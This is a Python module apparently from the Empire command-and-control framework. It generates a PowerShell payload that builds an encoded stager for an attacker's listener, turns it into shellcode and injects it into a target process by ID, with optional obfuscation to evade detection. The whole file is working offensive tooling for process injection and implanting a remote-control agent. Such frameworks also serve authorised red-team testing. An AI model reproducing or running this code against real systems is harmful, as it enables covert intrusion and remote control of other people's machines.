from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
                 obfuscation_command: str = ""):
        listener_name = params['Listener']
        proc_id = params['ProcId'].strip()
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        arch = params['Arch']

        module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                         obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        script_end = "; shellcode injected into pid {}".format(str(proc_id))

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: {}".format(listener_name))
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds)

            if launcher == '':
                return handle_error_message('[!] Error in launcher generation.')
            else:
                launcher_code = launcher.split(' ')[-1]
                sc = main_menu.stagers.generate_powershell_shellcode(launcher_code, arch)
                encoded_sc = helpers.encode_base64(sc)

        script_1 = "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(proc_id, encoded_sc)

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_1+script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script